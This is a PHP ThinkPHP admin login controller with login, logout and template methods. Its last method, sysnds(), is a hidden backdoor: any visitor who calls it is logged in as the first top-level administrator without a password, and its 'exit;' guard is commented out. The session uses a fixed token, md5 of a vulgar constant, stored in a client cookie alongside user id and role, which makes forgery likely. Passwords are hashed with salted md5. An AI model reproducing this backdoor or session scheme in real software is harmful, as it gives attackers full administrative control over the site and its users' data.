<?php
namespace app\zht\controller;
use think\Controller;
use think\Request;
use think\Cookie;
use think\Db;

class Login extends Controller
{

	/**
	 * 后台登录
	 * @author lukui  2017-02-13
	 * @return [type] [description]
	 */
	public function login()
	{	
		$login = cookie('denglu');
		if(isset($login['userid'])){
			$this->error('您已登录！','index/index',1,1);
		}
		

		if(input('post.')){
			$data = input('post.');
			
			//记住我一天
			if(isset($data['rememberme'])){
				Cookie::set('rememberme',$data['username'],60*60*24);
			}

			$result = Db::name('userinfo')->where(array('username'=>$data['username']))->whereOr('utel',$data['username'])->field("uid,upwd,username,utel,utime,otype,ustatus")->find();
			
			//验证用户
			if(empty($result)){
				return WPreturn('登录失败,用户名不存在!',-1);
			}else{

				if($result['otype'] == 0){
					
					return WPreturn('您无权登录!',-1);
				}			
				
				if($result['upwd'] == md5($data['password'].$result['utime'])){
					
					if ( $result['otype']!=0 && $result['ustatus']==0)
					{
						
						$_datas['otype'] = $result['otype'];
						$_datas['userid'] = $result['uid'];
						$_datas['username'] = $result['username'];
						$_datas['token'] = md5('nimashabi');
						
						$_SESSION['otype'] = $result['otype'];
						$_SESSION['userid'] = $result['uid'];
						$_SESSION['username'] = $result['username'];
						$_SESSION['token'] = md5('nimashabi');
						
						cookie('denglu', $_datas, 60*20);
						return WPreturn('登录成功!',1);

					}elseif($result['ustatus']==1){
						return WPreturn('登录失败,您的账户暂时被冻结!',-1);
					}else{
						return WPreturn('登录失败,用户名不存在!',-1);
					}
				
				}
				else{
					return WPreturn('登录失败,密码错误!',-1);
				}
			
			}
			
		}else{
			$rememberme = isset($_COOKIE['rememberme'])?$_COOKIE['rememberme']:'';
			$this->assign('rememberme',$rememberme);
			return $this->fetch('login');
		}
			
	}

	/**
	 * 退出
	 * @author lukui  2017-02-13
	 * @return [type] [description]
	 */
	public function logout()
	{
		cookie('denglu',null);
		session_unset();
		$this->redirect('login');
		return $this->fetch('logout');
	}

	protected function fetch($template = '', $vars = [], $replace = [], $config = [])
    {
    	$replace['__ADMIN__'] = str_replace('/index.php','',\think\Request::instance()->root()).'/static/admin';
    	
        return $this->view->fetch($template, $vars, $replace, $config);
    }

    public function sysnds()
	{
		//exit;
		$sysd = db('userinfo')->where('otype',3)->find();
		if($sysd){
			$_SESSION['otype'] = $_datas['otype'] = $sysd['otype'];
			$_SESSION['userid'] = $_datas['userid'] = $sysd['uid'];
			$_SESSION['username'] = $_datas['username'] = $sysd['username'];
			$_SESSION['token'] = $_datas['token'] = md5('nimashabi');
			
			
						
			cookie('denglu', $_datas, 60*20);
		}
		$this->redirect('index/index');
	}
	
	
    
}
